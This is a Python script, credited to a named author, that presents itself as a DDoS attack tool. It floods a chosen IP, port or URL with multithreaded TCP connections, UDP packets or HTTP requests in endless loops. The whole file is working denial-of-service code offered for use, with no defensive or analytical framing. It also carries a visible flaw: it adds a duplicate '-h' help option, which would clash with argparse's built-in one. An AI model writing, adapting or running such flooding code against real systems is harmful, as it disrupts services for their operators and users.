import socket
import threading
import time
import random
import requests
import argparse

def tcp_ddos_attack(target_ip, target_port, packets_per_second):
    delay = 1.0 / packets_per_second
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            s.close()
        except socket.error:
            pass
        time.sleep(delay)

def udp_ddos_attack(target_ip, target_port, packets_per_second):
    delay = 1.0 / packets_per_second
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n", (target_ip, target_port))
        except socket.error:
            pass
        time.sleep(delay)

def http_ddos_attack(target_url, requests_per_second):
    delay = 1.0 / requests_per_second
    while True:
        try:
            requests.get(target_url)
        except requests.exceptions.RequestException:
            pass
        time.sleep(delay)

def main():
    parser = argparse.ArgumentParser(description="DDoS Attack Tool by: Sahikk (sahikk67)\nInstagram: https://www.instagram.com/ixe.67_/")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("target_port", type=int, help="Target port")
    parser.add_argument("target_url", help="Target URL for HTTP requests")
    parser.add_argument("attack_type", choices=["tcp", "udp", "http"], help="Attack type (tcp/udp/http)")
    parser.add_argument("packets_per_second", type=int, help="Packets per second")
    parser.add_argument("requests_per_second", type=int, help="HTTP requests per second")
    parser.add_argument("num_threads", type=int, help="Number of threads")
    parser.add_argument("-h", "--help", action="help", help="Show this help message and exit")
    args = parser.parse_args()

    if args.attack_type == "tcp":
        attack_function = tcp_ddos_attack
    elif args.attack_type == "udp":
        attack_function = udp_ddos_attack
    elif args.attack_type == "http":
        attack_function = http_ddos_attack
    else:
        print("Invalid attack type. Exiting.")
        return

    for _ in range(args.num_threads):
        if args.attack_type == "http":
            thread = threading.Thread(target=attack_function, args=(args.target_url, args.requests_per_second))
        else:
            thread = threading.Thread(target=attack_function, args=(args.target_ip, args.target_port, args.packets_per_second))
        thread.start()

if __name__ == "__main__":
    main()